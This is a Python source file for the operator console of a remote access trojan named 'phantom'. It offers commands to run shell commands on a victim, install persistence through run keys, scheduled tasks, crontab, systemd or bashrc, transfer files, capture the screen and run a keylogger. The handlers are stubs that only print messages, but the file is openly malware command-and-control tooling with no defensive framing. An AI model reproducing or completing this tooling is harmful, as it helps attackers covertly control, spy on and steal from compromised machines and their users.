#!/usr/bin/env python3
"""Interactive session — shell-like interface for controlling a RAT client."""
import sys
import os
import json
import time
import struct
import socket
import asyncio
import threading

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

from server.database import Database
from tools.protocol import *

class InteractiveSession:
    """Interactive command shell for a RAT session."""

    HELP = """
Commands:
  shell <cmd>           Execute shell command on target
  sysinfo               Get system information
  ps                    List processes
  kill <pid>            Kill process by PID
  persist <method>      Install persistence (run_key|sched_task|crontab|systemd|bashrc)
  download <path>       Download file from target
  upload <local> <remote>  Upload file to target
  screen                Capture screen
  keylog start|stop|dump  Keylogger control
  screenshot            Alias for screen
  exit                  Close session
  help                  Show this help
"""

    def __init__(self, session_id: int):
        self.session_id = session_id
        self.db = Database()
        self.sock = None
        self.connected = False

    def connect_to_session(self) -> bool:
        """Connect to the C2 server's session."""
        # For interactive mode, we connect directly to the C2 server
        # which forwards commands to the client
        session = self.db.get_session(self.session_id)
        if not session:
            print(f"Session {self.session_id} not found")
            return False

        # In a real implementation, this would connect to the C2 server
        # which proxies commands to the client. For now, we simulate
        # by reading the last known IP and connecting directly.
        print(f"[*] Connecting to session {self.session_id} ({session['hostname']})...")
        print(f"    Host: {session['hostname']}")
        print(f"    OS: {session['os']}")
        print(f"    User: {session['user']}")
        print(f"    IP: {session['ip']}")
        print(f"    Status: {session['status']}")
        self.connected = True
        return True

    def run(self):
        """Run the interactive shell."""
        if not self.connect_to_session():
            return

        print(self.HELP)

        while True:
            try:
                cmd = input(f"phantom({self.session_id}) > ").strip()
                if not cmd:
                    continue

                parts = cmd.split()
                action = parts[0]

                if action == "help":
                    print(self.HELP)

                elif action == "exit":
                    print("[*] Closing session")
                    break

                elif action == "sysinfo":
                    print("[*] Requesting system info...")
                    # In real implementation: send CMD_SYSINFO, receive response
                    print("    (would send CMD_SYSINFO to client)")

                elif action == "shell":
                    if len(parts) < 2:
                        print("Usage: shell <command>")
                        continue
                    shell_cmd = " ".join(parts[1:])
                    print(f"[*] Executing: {shell_cmd}")
                    print("    (would send CMD_SHELL to client)")

                elif action == "ps":
                    print("[*] Listing processes...")

                elif action == "kill":
                    if len(parts) < 2:
                        print("Usage: kill <pid>")
                        continue
                    print(f"[*] Killing PID {parts[1]}")

                elif action == "persist":
                    if len(parts) < 2:
                        print("Usage: persist <run_key|sched_task|crontab|systemd|bashrc>")
                        continue
                    print(f"[*] Installing persistence: {parts[1]}")

                elif action == "download":
                    if len(parts) < 2:
                        print("Usage: download <remote_path>")
                        continue
                    print(f"[*] Downloading {parts[1]}")

                elif action == "upload":
                    if len(parts) < 3:
                        print("Usage: upload <local_path> <remote_path>")
                        continue
                    print(f"[*] Uploading {parts[1]} → {parts[2]}")

                elif action in ("screen", "screenshot"):
                    print("[*] Capturing screen...")

                elif action == "keylog":
                    if len(parts) < 2:
                        print("Usage: keylog start|stop|dump")
                        continue
                    print(f"[*] Keylogger: {parts[1]}")

                else:
                    print(f"Unknown command: {action}. Type 'help' for commands.")

            except KeyboardInterrupt:
                print("\n[*] Ctrl+C — type 'exit' to close session")
            except EOFError:
                break
            except Exception as e:
                print(f"Error: {e}")
